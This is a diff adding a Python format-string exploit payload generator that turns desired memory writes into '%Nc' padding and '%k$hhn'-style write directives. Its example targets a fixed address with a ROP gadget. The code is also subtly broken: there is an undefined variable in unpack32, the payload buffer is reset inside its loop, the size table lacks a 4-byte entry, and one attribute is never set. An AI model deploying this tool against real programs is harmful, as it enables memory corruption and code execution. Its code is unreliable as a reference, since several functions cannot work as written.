@@ -1,0 +1,306 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+import sys
+import struct
+from collections import OrderedDict
+import operator
+from functools import wraps
+
+def debug(func):
+    @wraps(func)
+    def wrapper_debug(*args, **kwargs):
+        args_repr=[repr(a) for a in args]
+        kwargs_repr=[f"{k}={v!r}" for k, v in kwargs.items()]
+        print(f"Calling: {func.__name__}")
+        print("Args: {}".format(args_repr))
+        print("Kwargs: {}".format(kwargs_repr))
+        value = func(*args, **kwargs)
+        print(f"{func.__name__} returned {value!r}")
+        return value
+    return wrapper_debug
+
+def cmp(a, b):
+    return (a > b) - (a < b)
+
+def pack32(n):
+    """
+    Packs an 32-bit unsigned int to structure
+    """
+    return struct.pack("<I", int(n))
+
+def pack64(n):
+    """
+    Packs an 64-bit unsigned int to structure
+    """
+    return struct.pack("<Q", int(n))
+
+def unpack32(s):
+    """
+    Unpacks a 4-byte structure to unsigned int_32
+    """
+    return struct.unpack("<Q", n)[0]
+
+def unpack64(s):
+    """
+    Unpacks a 8-byte structure to unsigned int_64
+    """
+    return struct.unpack("<Q", s)[0]
+
+def unpack(s, is64):
+    """
+    Unpacking 4/8-byte structure to 32/64 bit unsigned int 
+    """
+    if is64:
+        return unpack64(s)
+    else:
+        return unpack32(s)
+
+def pack(n, is64):
+    if is64:
+        return pack64(n)
+    else:
+        return pack32(n)
+
+class FormatStr:
+    def __init__(self, buffer_size=0, isx64=0, autosort=True):
+        if autosort:
+            self.mem = {}
+        else:
+            self.mem = OrderedDict()
+        
+        self.buffer_size = buffer_size
+        self.autosort = autosort
+        self.isx64 = isx64
+        self.parsers = {
+            list:   self._set_list,
+            str:   self._set_str,
+            int:   self._set_dword,
+            Word:   self._set_word,
+            Byte:   self._set_byte,
+        }
+
+        # print("Buffer size: {}".format(self.buffer_size))
+        # print("Autosort: {}".format(self.autosort))
+
+    def __setitem__(self, addr, value):
+        addr_type=type(addr)
+        if addr_type == int:
+            if self.isx64:
+                addr = addr % (1<<64)
+            else:
+                addr = addr % (1<<32)
+        elif addr_type == str:
+            addr = unpack(addr, self.is64)
+        else:
+            raise TypeError("Address must be int or packed int, not: " + str(addr_type))
+    
+        val_type = type(value)
+        if val_type == type(self):
+            val_type == value.__class__
+
+        if val_type in self.parsers:
+            return self.parsers[val_type](addr, value)
+        else:
+            raise TypeError("Unknown type of value" + str(val_type))
+    
+    def __getitem__(self, addr):
+        return self.mem[addr]
+
+    def _set_list(self, addr, lst):
+        for i, value in enumerate(lst):
+            addr = self.__setitem__(addr, value)
+        return addr
+    
+    def _set_str(self, addr, s):
+        for i, c in enumerate(s):
+            self._set_byte(addr + i, ord(c))
+        return addr + len(s)
+
+    def _set_dword(self, addr, value):
+        for i in range(4):
+            self.mem[addr+i] = (int(value) >> (i*8) % (1 << 8))
+        return addr + 4
+
+    def _set_word(self, addr, value):
+        for i in range(2):
+            self.mem[addr+i] = (int(value) >> (i*8) % (1 << 8))
+        return addr + 2
+
+    def word(self, addr, value):
+        return self._set_word(addr, value)
+
+    def _set_byte(self, addr, value):
+        self.mem[addr] = int(value) % (1<<8)
+        return addr + 1
+
+    def byte(self, addr, value):
+        return self._set_byte(addr, value)
+
+    def dword(self, addr, value):
+        return self._set_dword(addr, value)
+
+    def payload(self, *args, **kwargs):
+        gen = PayloadGenerator(self.mem, self.buffer_size, is64=self.isx64, autosort=self.autosort)
+        return gen.payload(*args,**kwargs)
+
+class PayloadGenerator:
+    def __init__(self, mem=OrderedDict(), buffer_size=0, is64=0, autosort=True):
+        """
+        Make tuples like (address, word/dword, value), sorted by value as default.
+        Trying tp avoid null byte by using preceding address in the case.
+        """
+        self.is64 = is64
+        self.mem = mem
+        self.buffer_size = buffer_size
+        self.tuples = []
+        self.autosort = autosort
+        if autosort:
+            self.addrs = list(mem.keys()) # addresses of each byte to set
+        else:
+            self.addrs = list(sorted(mem.keys()))
+
+        addr_index=0
+        while addr_index < len(self.addrs):
+            addr=self.addrs[addr_index]
+            addr=self.check_nullbyte(addr)
+
+            dword = 0
+            for i in range(4):
+                if addr + i not in self.mem:
+                    dword = -1
+                    break
+                dword |= self.mem[addr+i] << (i*8)
+
+            if 0 <= dword < (1 << 16):
+                self.tuples.append((addr, 4, dword))
+                if self.addrs[addr_index] == addr + 1:
+                    addr_index += 1 #backstepped
+                elif self.addrs[addr_index+1] == addr + 1:
+                    addr_index += 1
+                else:
+                    raise ValueError("Unknown error. Missing bytes")
+                continue
+            else:
+                if addr_index > 0 and self.addrs[addr_index - 1] > self.addrs[addr_index] - 1:
+                    addr_index -= 1 # can't fit one byte, backstepping
+                else:
+                    self.tuples.append((addr, 1, self.mem[addr]))
+                    addr_index += 1
+        if autosort:
+            self.tuples.sort(key=operator.itemgetter(2))
+        return
+
+    def check_nullbyte(self, addr):
+        if b"\x00" in pack(addr, self.is64):
+            # Check if preceding address can be used
+            if (addr - 1) not in self.mem or b"\x00" in pack(addr - 1, self.is64):
+                # To avoid null bytes in last byte of address, set previous byte
+                warning("Can't avoid null byte at address " + hex(addr))
+            else:
+                return addr - 1
+        return addr
+
+    def payload(self, arg_index, padding=0, start_len=0):
+        """
+        @arg_index - index of argument, pointing to payload
+        @padding - determing padding size needed to align dwords (padding will be added)
+        @start_len - len of already printed data (we can't change this)
+        """
+        if self.is64:
+            align = 8
+        else:
+            align = 4
+        prev_len = -1
+        index = arg_index * 10000 # enough for sure
+        while True:
+            payload=bytearray()
+            addrs = b""
+            printed = start_len
+            for addr, size, value in self.tuples:
+                print_len = value - printed
+                if print_len < 0: # Patches some errors
+                    if size == 1:
+                        print_len &= 0xff
+                    elif size == 2:
+                        print_len & 0xffff
+                    elif size == 4:
+                        print_len & 0xffffffff
+                if print_len > 2:
+                    #print(f"{type(payload)}")
+                    #print(f"{type(print_len)}")
+                    #payload += b"%" + str(print_len).encode("utf-8") + b"c"
+                    item = b'%' + str(print_len).encode() + b'c'
+                    payload.extend(item)
+                elif print_len >= 1:
+                    payload.extend(b"A"*print_len)
+                else:
+                    warning("Can't write a value %08x (too small) %08x." % (value, print_len))
+                    continue
+                
+                modi = {
+                    1: b"hh",
+                    2: b"h",
+                    3: b"",
+                }[size]
+                payload = bytearray()
+                payload.extend(b"%" + str(index).encode() + b"$" + modi + b"n")
+                addrs += pack(addr, self.is64)
+                printed += print_len
+                index += 1
+
+            payload.extend(b"A"*((padding - len(payload)) % align))
+            if len(payload) == prev_len:
+                payload.extend(addrs) # argnumbers are set right
+                break
+            
+            prev_len = len(payload)
+
+            index = arg_index + len(payload) // align
+        
+        if b"\x00" in payload:
+            warning("Payload contains NULL bytes.")
+        return payload.ljust(self.buffer_size, b"\x90")
+
+class Word:
+    def __init__(self, value):
+        self.value = value % (1 << 16)
+    
+    def __int__(self):
+        return self.value
+
+class Byte:
+    def __init__(self, value):
+        self.value = value % (1 << 8)
+    
+    def __int__(self):
+        return self.value
+
+def tuples_sorted_by_values(adict):
+    """Return list of (key, value) pairs of @adict sorted by values"""
+    return sorted(adict.items(), lambda x, y: cmp(x[1], y[1]))
+
+def tuples_sorted_by_keys(adict):
+    """Return list of (key, value) pairs of @adict sorted by values"""
+    return sorted(adict.items(), adict.keys())
+
+def warning(s):
+    print("WARNING: %s" % (s), file=sys.stderr)
+
+def main():
+    # Usage example
+    addr = 0x08049580
+    #print("packed: {}".format(pack(addr, 0)))
+    #rop = [0x080487af, 0x0804873c, 0x080488de]
+    rop = [0x080487af]
+    p = FormatStr()
+    p[addr] = rop
+
+    # # buf is 14th argument, 3 bytes padding
+    pay = p.payload(14, 3)
+    print(pay)
+    #sys.stdout.write("".join([p for p in pay]))
+
+if __name__=="__main__":
+    main()
+    
